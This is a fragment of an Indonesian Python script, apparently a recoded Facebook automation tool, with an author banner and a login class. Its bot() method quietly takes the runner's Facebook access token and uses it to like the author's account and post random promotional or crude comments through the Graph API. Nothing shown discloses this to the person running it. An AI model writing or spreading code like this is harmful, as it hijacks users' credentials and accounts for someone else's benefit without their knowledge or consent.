...
komen = random.choice(['Mantap bang @[100000626195514:0] I Love You','Pengguna script ganja kamu bang @[100000626195514:0]','Kamu ganteng banget deh @[100068397981838:0]','Kamu ganteng banget deh bang @[100068397981838:0]','Kamu manis bang bang @[100068397981838:0]','Kamu keren 😍banget anak siapa @[100068397981838:0]','Kamu ganteng banget bang @[100068397981838:0]','Mantap bang love you','Khamdihi nggak ada obat script nya emang','pengin kaya elu bang bisa ngocok stading @[100000626195514:0]'])
...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Godong Boding:fb/Nyong sapa
 [\x1b[1;96m+%s] Recodo  : Niki mark
 [\x1b[1;96m+%s] Follow ig : Nikikiy.4
  Sc ini Sc free tidak untuk di perjual belikan kasihan.autor nya 
 sc ini saya Recode jika andah ingin sc nih lebih enak nya minta ke autor 
 nya langsung terima kasi
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100068397981838/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/254018450221419/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/100068397981838/likes?summary=true&access_token=' + toket)
